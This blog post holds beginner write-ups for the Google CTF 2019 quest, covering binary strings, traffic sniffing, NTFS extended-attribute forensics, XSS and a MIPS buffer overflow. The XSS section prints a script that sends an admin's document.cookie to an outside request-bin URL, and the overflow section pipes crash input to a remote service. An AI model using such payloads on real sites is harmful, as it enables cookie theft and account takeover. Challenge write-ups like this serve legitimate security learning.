---
title: 'Writeups for Google CTF 2019: My first CTF (Kinda) - Part 1'
layout: post
sidebar_link: true
tags:
- CTF
- Google CTF 2019
- Security
- Security Challenges
---

Here's a list of writeups on the Beginners quest section of the Google CTF 2019. (Why just the quest section? because first CTF requires appropriate expectations of successs):


![Beginners Quest Map](/images/ctf_images/google_2019/beginners_quest.png)



## <a name="spacetime"> **Enter Spacetime Coordinates  - Misc** </a>
![Satellite](/images/ctf_images/google_2019/spacetime.png)

You look at the challenge, download the attached document, unzip the downloaded file and find this:
```
.
├── 00c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed
├── log.txt
└── rand2
```

> Tip: always use the [file](https://linux.die.net/man/1/file) command to get an idea of what kind of file you are dealing with.

Let's give `rand2.txt` to the `file` command:


```
$file rand2
rand2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0208fc60863053462fb733436cef1ed23cb6c78f, not stripped
```
This seems like a good old [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) file. Alright, time to make it executable and run it:

> Tip: always try running the exectuable and following the most simple execution path.



```
$./rand2
Travel coordinator
0: AC+79 3888 - 137584823504239, 43534043465682
1: Pliamas Sos - 253278988691421, 87075501343409
2: Ophiuchus - 83187842604610, 62534244073891
3: Pax Memor -ne4456 Hi Pro - 75701500411216, 204191295118722
4: Camion Gyrin - 10179841572619, 237768916455567
5: CTF - <REDACTED>

Enter your destination's x coordinate:
>>> 101
Enter your destination's y coordinate:
>>> 201
Arrived somewhere, but not where the flag is. Sorry, try again.
```

So we see that the program requires us  to enter coordinates and it also helps us by providing coordinates for things but not our flag which is **redacted!**

Okay, maybe we can find something interesting in `log.txt` :
```
$cat log.txt
0: AC+79 3888{6652492084280_198129318435598}
1: Pliamas Sos{276116074108949_243544040631356}
2: Ophiuchus{11230026071572_273089684340955}
3: Pax Memor -ne4456 Hi Pro{21455190336714_219250247519817}
4: Camion Gyrin{235962764372832_269519420054142}
```

Well,  `log.txt` doesn't seem very helpful. 

Now what? we can totally open up `radare2` or any other cool tool but let's stick to the basics, it's an ELF and contains the flag somewhere inside it.

So we run [strings](https://linux.die.net/man/1/strings)  on our executable:
```
$strings ./rand2 
/lib64/ld-linux-x86-64.so.2
0SF/
libc.so.6
__isoc99_scanf
puts
time
printf
__cxa_finalize
strcmp
__libc_start_main
...
...
```

Wow, it gives us a giant list of strings.  Lets [grep ](https://linux.die.net/man/1/grep) for something more relatable to our cause:
```
$strings ./rand2  | grep flag
Arrived at the flag. Congrats, your flag is: CTF{welcome_to_googlectf}
Arrived somewhere, but not where the flag is. Sorry, try again.
```

And there we go folks, found our first flag!

**Lesson learned:** [Keep it simple, stupid](https://en.wikipedia.org/wiki/KISS_principle)

## <a name="satellite"> **Satellite - networking** </a>
![Satellite](/images/ctf_images/google_2019/satellite.png)

Let's take a cue from our previous challenge and download, unzip and inspect the files in the attachment:
```
.
├── 768be4f10429f613eb27fa3e3937fe21c7581bdca97d6909e070ab6f7dbf2fbf
├── init_sat
└── README.pdf
```

Having a look at the `init_sat` file with our `file` command, we learn it's an ELF built with [Go](https://golang.org/) and so can't really be debugged with [Gdb](https://en.wikipedia.org/wiki/GNU_Debugger). Well, we can still open up the accompanying `README.pdf`:
![README.pdf](/images/ctf_images/google_2019/sat_README.png)

There are a couple of hints here:
> communication, read the space-static, set up the satellites and satellite name "Osmium"

Alrighty, let's not muck about with what `init_sat` may do and let's just execute it!
```
$./init_sat
Hello Operator. Ready to connect to a satellite?
Enter the name of the satellite to connect to or 'exit' to quit
osmium
Establishing secure connection to osmium
 satellite...
Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect

a
Username: brewtoot password: ********************       
166.00 IS-19 2019/05/09 00:00:00        Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        
167.Daily acquisition capacity: 220,000km²   
Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
```

So we can see that our `init_sat` connects to a server to provide us with options. Selecting the `a` option, we are given a URL to a google docs sheet:
![Google Docs Sheet](/images/ctf_images/google_2019/sat_config_data.png)

Hmm, that looks like an interesting pattern of text, especially with the string ending in a couple of *"="*. Sure enough, if we squint at it for a long time, we can see that this is a [base64-encoded](https://en.wikipedia.org/wiki/Base64) string.  So using the [base64](https://linux.die.net/man/1/base64) program, we can decode the text:
```
$echo "VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==" | base64 -d
Username: wireshark-rocks
Password: start-sniffing!
```

So the hint is obvious at this point, We need to start sniffing the connection between the `init_sat` and the server!

To do this, we simply fire up [Wireshark](https://wiki.wireshark.org/) or any other sniffing tool (even the simple [tcpdump](https://linux.die.net/man/8/tcpdump) could do the job!) and keeping our sniffing tool open we execute our target file, `init_sat` in this case and just observe the traffic!

![Wirehsark packet](/images/ctf_images/google_2019/sat_wire.png)

Brushing aside all the unrelated (and also sensitive) captured packets, we get this DNS query to the sub-domain of `satellite.ctfcompetition.com`!

Now the first step after finding our server is to port scan it with nmap but after a couple of minutes it was clear that all the ports are either closed or filtered :(

Well, we know that our executable connects to this sub-domain and we know that address is sure to be inside our executable, putting these two facts together, we should probably welcome back our old friend `strings` and search of some more context with our newly acquired sub-domain!
<pre>
$strings ./init_sat  | grep  "satellite.ctfcompetition.com"
...
...
...type offset out of range<b>satellite.ctfcompetition.com:1337</b>stackalloc ...
...
</pre>

Here we go! it's the old [port 1337](https://www.speedguide.net/port.php?port=1337) that's being used to connect to our server.

Now let's do the most simple thing first, connect to our server on port 1337:
```
$nc satellite.ctfcompetition.com 1337
Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect

a
Username: brewtoot password: CTF{4efcc72090af28fd33a2118985541f92e793477f}      166.00 IS-19 2019/05/09 00:00:00 Swath 640km     Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m Daily acquisition capacity: 220,000km²  Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
```

And there we have our second flag!

**Lesson learned:** Keep a list of everything at hand! ([Here's a good one](https://github.com/JohnHammond/ctf-katana))

## 1st Choice!

Submitting the second flag, we come to the first choice between two routes in the quest:
![1st_choice](/images/ctf_images/google_2019/1st_choice.png)

Let's take the `Home` route first!

##  <a name="homecomputer"> Home Computer - Forensics </a>
![home_computer.png](/images/ctf_images/google_2019/home_computer.png)

Again downloading and unzipping the attachments we some files:
```
.
├── 86863db246859897dda6ba3a4f5801de9109d63c9b6b69810ec4182bf44c9b75
├── family.ntfs
└── note.txt
```

The `note.txt` just seems to tell us to rename `family.ntfs` to `family.dmg` if we are on MacOS, so let's just jump straight to our [ntfs](https://en.wikipedia.org/wiki/NTFS) file and [mount](https://linux.die.net/man/8/mount) it on a mount point under `/mnt` by running:
```
sudo mount -t ntfs family.ntfs  /mnt
```
and now let's see the files inside mount:
```
.
├── bootmgr
├── BOOTNXT
├── pagefile.sys
├── Program Files
├── Program Files (x86)
├── Setup.log
├── SSUUpdater.log
├── swapfile.sys
├── Users
└── Windows
```

This clearly looks like your average Windows `C:/` directory partition. Let's prod around a little in the file structure to find something interesting.
> Tip: The Users directory contains all the documents and downloads by the user so that should always be checked first.

Looking around for a while, we find something interesting in `/mnt/Users/Family/Documents`:
```
.
├── credentials.txt
├── document.pdf
└── preview.pdf
```

The output of `credentials.txt`:
```
I keep pictures of my credentials in extended attributes.
```

Alright, go and have a look at what [extended attributes](https://en.wikipedia.org/wiki/Extended_file_attributes)  are. 

Now, let's use the [attr](https://linux.die.net/man/5/attr) program to list out extended attributes of our `credentials.txt` file:
```
$attr -l credentials.txt
Attribute "FILE0" has a 38202 byte value for credentials.txt
```

Okay let's get the value of the key `FILE0`:
```
$attr -g FILE0 credentials.txt
...
```
This spills out a heck lot of strange characters, okay time to redirect all this output to a file:
```
$attr -g FILE0 credentials.txt > cred
```

Now we need to find out what type of data this is  (although we have been given a clear hint in the `credentials.txt` file that this should be a picture, let's be specific) and in order to do let's use the following basic information:
1. if it's a specific file format, it will have a specific header or file signature (mostly it's in the form of a specific header)
2. if we can see the header of the file format, we can understand what type of file it is.

Now taking into account these two things, let's try to output first few bytes of our file `cred` with the aid of the [head](https://linux.die.net/man/1/head) and [hexdump](https://linux.die.net/man/1/hexdump) programs:
```
$cat cred | head -c 128 | hexdump -C
00000000  41 74 74 72 69 62 75 74  65 20 22 46 49 4c 45 30  |Attribute "FILE0|
00000010  22 20 68 61 64 20 61 20  33 38 32 30 32 20 62 79  |" had a 38202 by|
00000020  74 65 20 76 61 6c 75 65  20 66 6f 72 20 63 72 65  |te value for cre|
00000030  64 65 6e 74 69 61 6c 73  2e 74 78 74 3a 0a 89 50  |dentials.txt:..P|
00000040  4e 47 0d 0a 1a 0a 00 00  00 0d 49 48 44 52 00 00  |NG........IHDR..|
00000050  04 d2 00 00 01 53 08 02  00 00 00 73 b9 b6 5e 00  |.....S.....s..^.|
00000060  00 00 03 73 42 49 54 08  08 08 db e1 4f e0 00 00  |...sBIT.....O...|
00000070  00 19 74 45 58 74 53 6f  66 74 77 61 72 65 00 67  |..tEXtSoftware.g|
00000080
```

We can clearly see error message and after that a mention of `PNG`. Looking at the [PNG File Format](https://en.wikipedia.org/wiki/Portable_Network_Graphics), we realise that this header is a bit off and needs to be edited to start with the regular 8-byte signature - `89 50 4E 47 0D 0A 1A 0A`.

So using any kind of hex editor just delete the message upto the byte `89` and save the file. Now since we know this is *.png* file, let's open it with any image viewer:
![Home_cred.png](/images/ctf_images/google_2019/home_cred.png)

And there we go, got our Flag!

**Lesson Learned:**  always remember to extract file signature when dealing with unknown files formats ([Here's a search tool](http://file-extension.net/seeker/))

## <a name="government"> Government Agricultural Network - Web </a>
![government.png](/images/ctf_images/google_2019/government.png)

Alright we go to the given url to find a textbox with which we can apparently create a new post:
![government_site.png](/images/ctf_images/google_2019/government_site.png)

Trying some random text we and hitting the submit button we are led to this page:
![government_post.png](/images/ctf_images/google_2019/government_post.png)

Also this inspecting the request in developer tools we can see it's a `post` request:
![government_method.png](/images/ctf_images/google_2019/government_method.png)

Nothing much to see except the message tells us the admin will review the post shortly. This means that we can send data to the `admin` through this method and it will be evaluated, seems like a perfect ground for a [Cross Site Scripting (XSS) attack](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))!

> Tip: https://www.owasp.org is an excellent resource to learn about various exploitation techniques!

Okay let's use the help of [PostBin](https://postb.in/) to get output of our payload and create a new bin:
![government_bin.png](/images/ctf_images/google_2019/government_bin.png)

Now let's create our payload to send to the `admin`
```
<script>
 location.href = 'https://postb.in/1561983861427-6059538838453?cookie='+document.cookie;
</script>
```

When the `admin` reviews the post it gets directed to the bin of our choice with all the precious cookies that might contain some relevant information for us!

After posting our payload, let's see the output in our bin:
![government_flag.png](/images/ctf_images/google_2019/government_flag.png)

Well, looks like we got our Flag in some tasty cookies!

**Lesson Learned:** Always consult [OWASP](https://www.owasp.org/).

## <a name="stopgan"> Stop GAN - Pwn </a>
![stop_gan.png](/images/ctf_images/google_2019/stop_gan.png)

Again downloading and unzipping we have:
```
.
├── 4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a
├── bof
└── console.c
```

Let's have a look at the binary first:
```
$./bof
Cauliflower systems never crash >>
a
```

And we input `a` and it just cleanly exists. Okay there are a couple of hints: the never crash message, the filename `bof` as in buffer overflow so we have an idea that we need to overflow it.

> Tip: Always use checksec and file commands in a pwn challenge to understand the binary vulnerabilities present.

Taking cue, we run a quick [checksec](https://github.com/slimm609/checksec.sh) on the binary and we get:
```
$checksec -f ./bof
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   1817 Symbols     Yes    0               41      ./bof
```

Also let's just run `file` to any more info:
```
$file bof
bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
```

So we don't have neither [stack canary](https://ctf101.org/binary-exploitation/stack-canaries/) nor [NX](https://ctf101.org/binary-exploitation/no-execute/) to deal with, so not much to worry about this seems like a simple buffer-overflow situation. One important thing to note is that elf is a mips executable and is little endian architecture. So we won't be able to use our out of the box gdb for debugging purposes. 

Let's take a look at the other c source code file now:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/**
 * 6e: bufferflow triggering segfault  - binary, compile with:
 * gcc /tmp/console.c -o /tmp/console -static -s
 *
 * Console allows the player to get info on the binary.
 * Crashing bof will trigger the 1st flag.
 * Controlling the buffer overflow in bof will trigger the 2nd flag.
 */

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  char inputs[256];
  printf("Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.\n Bonus flag for controlling the crash.\n");
  while(1) {
    printf("\nConsole commands: \nrun\nquit\n>>");
    if (fgets(inputs, 256, stdin) == NULL) {
      exit(0);
    }
    printf("Inputs: %s", inputs);
    if ( strncmp(inputs, "run\n\0", 256) == 0 ) {
      int result = system("/usr/bin/qemu-mipsel-static ./bof");
      continue;
    } else if ( strncmp(inputs, "quit\n\0", 256) == 0 ) {
      exit(0);
    } else {
      puts("Unable to determine action from your input");
      exit(0);
    }
  }
  return 0;
}
```

Well by reading the comments in the program it's clear what we need to do, let's compile the program first and run it:
```
./console
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>
```

The `run` command runs the `bof` binary and then expects us to overflow it.

Let's try crashing the program by manually entering a lot of input and see what happens:
```
$./console
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>run
Inputs: run
Cauliflower systems never crash >>
ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
segfault detected! ***CRASH***could not open flag
```

This clearly crashes the program! So let's try the same thing on official server but with a little help from python to automate our input:
```
$python2 -c "print 'run';print 'A'*999" | nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>Inputs: run
CTF{Why_does_cauliflower_threaten_us}
Cauliflower systems never crash >>
segfault detected! ***CRASH***
Console commands:
run
quit
>>
```

Here we got the next flag! So doing this we finally come to the end of this route that we had taken. Let's go back to the other route now in the [next part](/2019/06/29/Google-CTF-Writeups-Part-2.html)!